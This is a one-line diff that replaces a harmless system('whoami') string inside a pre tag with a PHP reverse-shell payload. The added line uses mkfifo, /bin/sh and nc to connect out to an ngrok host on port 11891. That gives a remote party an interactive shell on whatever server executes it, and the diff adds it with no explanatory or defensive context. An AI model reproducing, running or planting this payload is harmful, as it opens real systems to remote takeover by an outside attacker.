@@ -1,1 +1,1 @@
-<pre>system('whoami')</pre>
+<pre>system('<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 6.tcp.eu.ngrok.io 11891 >/tmp/f"); ?>')</pre>
